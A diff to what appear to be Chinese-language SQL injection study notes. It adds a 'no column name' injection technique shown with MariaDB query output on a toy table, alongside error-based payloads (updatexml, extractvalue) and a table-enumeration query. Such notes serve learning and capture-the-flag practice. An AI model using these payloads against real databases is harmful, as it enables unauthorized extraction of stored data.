@@ -90,4 +90,57 @@ select group_concat(table_name) from mysql.innodb_table_stats
   - ``updatexml(1,concat(1,(<SQLi>)),1)``
   - ``extractvalue(1,concat(1,<SQli>))``
 
+- 无列名注入
+  考虑这样的表格，使用select 1,2,3,4,5 union select * from persons可以得到一张新的表格
+
+  ```
+  MariaDB [test]> select * from persons;
+  +------+----------+-----------+--------------+--------+
+  | ID   | LastName | FirstName | Address      | Credit |
+  +------+----------+-----------+--------------+--------+
+  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
+  |    1 | Gates    | Bill      | Xuanwumen 10 |   NULL |
+  |    2 | Xill     | Hiler     | Like 10      | 100.67 |
+  |    2 | Eki      | Hiler     | Nanfen 10    | 100.67 |
+  +------+----------+-----------+--------------+--------+
   
+  ->
+  
+  MariaDB [test]> select 1,2,3,4,5 union select * from persons;
+  +------+-------+-------+--------------+--------+
+  | 1    | 2     | 3     | 4            | 5      |
+  +------+-------+-------+--------------+--------+
+  |    1 | 2     | 3     | 4            |      5 |
+  |    1 | Gates | Bill  | Xuanwumen 10 |   NULL |
+  |    2 | Xill  | Hiler | Like 10      | 100.67 |
+  |    2 | Eki   | Hiler | Nanfen 10    | 100.67 |
+  +------+-------+-------+--------------+--------+
+  ```
+
+  然后就可以套娃拿数据了,注意``a``这个别名(任意内容)是必须的（新生成的表）
+
+  ```
+  MariaDB [test]> select `2` from (select 1,2,3,4,5 union select * from persons)a;          
+  +-------+
+  | 2     |
+  +-------+
+  | 2     |
+  | Gates |
+  | Xill  |
+  | Eki   |
+  +-------+
+  ```
+
+  或者也可以将数字换成别名 在反引号不可用的情况下
+
+  ```
+  MariaDB [test]> select b from (select 1,2 as b,3,4,5 union select * from persons)a;
+  +-------+
+  | b     |
+  +-------+
+  | 2     |
+  | Gates |
+  | Xill  |
+  | Eki   |
+  +-------+
+  ```
